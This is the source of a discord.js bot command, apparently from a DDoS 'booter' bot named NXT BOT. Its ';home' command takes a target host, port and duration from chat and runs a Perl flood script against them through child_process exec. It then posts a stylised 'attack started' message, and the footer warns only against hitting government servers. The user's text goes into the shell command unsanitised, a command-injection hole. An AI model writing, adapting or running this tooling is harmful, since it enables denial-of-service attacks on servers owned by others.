const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const duration = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex ;home 1.1.1.1 80 60`")
	.setFooter("Please do not attack government server!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`perl home.pl ${host} ${port} 65500 ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('๐ **NXT BOT** ๐')
	.setTimestamp()
  .setDescription("**๐๐ต๐ช๐ท**: `VIP ๐จ` \n **๐ฃ๐ช๐ป๐ฐ๐ฎ๐ฝ** : `" + host + "` \n **๐๐ธ๐ป๐ฝ** : `" + port + "` \n **๐๐ฎ๐ฝ๐ฑ๐ธ๐ญ** : `HOME ๐ฃ` \n **๐ฃ๐ฒ๐ถ๐ฎ** : `" + duration + "`")
	.setFooter('ยฉ Developer: Nguyแปn Xuan Trฦฐแปng#2007', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media.giphy.com/media/l4KhQo2MESJkc6QbS/giphy.gif", "https://media.giphy.com/media/jzHFPlw89eTqU/giphy.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('๐ **NXT BOT** ๐')
	.setTimestamp()
	.setDescription("**โบ ๐๐ต๐ฎ๐ช๐ผ๐ฎ ๐๐ช๐ฒ๐ฝ ๐ฏ๐ธ๐ป ๐ฟ๐ฎ๐ป๐ฒ๐ฏ๐ฒ๐ฌ๐ช๐ฝ๐ฒ๐ธ๐ท **")
	.setFooter('ยฉ Developer: Nguyแปn Xuan Trฦฐแปng#2007', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['home'],
  permLevel: 0
}

exports.help = {
  name: 'home',
  description: 'Nguyแปn Xuan Trฦฐแปng',
  usage: 'home'
}
